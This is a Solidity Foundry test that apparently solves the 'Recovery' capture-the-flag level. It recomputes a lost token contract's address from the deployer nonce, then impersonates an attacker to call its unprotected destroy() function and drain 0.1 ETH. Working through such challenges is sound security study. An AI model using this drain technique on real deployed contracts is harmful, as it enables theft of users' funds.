// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Recovery.sol";

contract RecoveryTest is Test {
    Recovery recovery;
    address owner;
    address attacker;
    uint256 ethAmount = 0.1 ether;

    function setUp() public {
        // Deploy the Recovery contract
        owner = address(this); // Address of the test contract
        attacker = vm.addr(1); // Simulated EOA for the attacker
        recovery = new Recovery();

        // Deploy three SimpleToken contracts using the Recovery contract
        recovery.generateToken("Token1", 1000);
        recovery.generateToken("Token2", 1000);
        recovery.generateToken("Token3", 1000); // Third token created here

        // Compute the address of the third deployed SimpleToken
        address tokenAddress3 = computeCreateAddress(address(recovery), 2); // Nonce is 2 for the third token
        SimpleToken token3 = SimpleToken(payable(tokenAddress3));

        // Send some ETH to the third SimpleToken contract
        (bool sent, ) = payable(tokenAddress3).call{value: ethAmount}("");
        require(sent, "Failed to send ETH");

        // Verify that the third token received ETH
        uint256 tokenBalance = tokenAddress3.balance;
        assertEq(
            tokenBalance,
            ethAmount,
            "Third token contract should have 0.1 ETH"
        );

        // Print the token contract address and balance before attack
        console.log("Token Address:", tokenAddress3);
        console.log("Balance before attack:", tokenBalance);
    }

    function testRecoveryAttack() public {
        // Compute the address of the third deployed SimpleToken
        address tokenAddress3 = computeCreateAddress(address(recovery), 2); // Nonce is 2 for the third token

        // Impersonate attacker
        vm.startPrank(attacker);

        // Call the attack by invoking the destroy function on the third token contract
        SimpleToken(payable(tokenAddress3)).destroy(payable(attacker));

        vm.stopPrank();

        // Check that the third token contract is now empty
        uint256 tokenBalanceAfter = tokenAddress3.balance;
        assertEq(
            tokenBalanceAfter,
            0,
            "Third token contract should be empty after attack"
        );

        // Check that the attacker received the ETH
        uint256 attackerBalance = attacker.balance;
        assertEq(
            attackerBalance,
            ethAmount,
            "Attacker should have received 0.1 ETH"
        );
    }
}
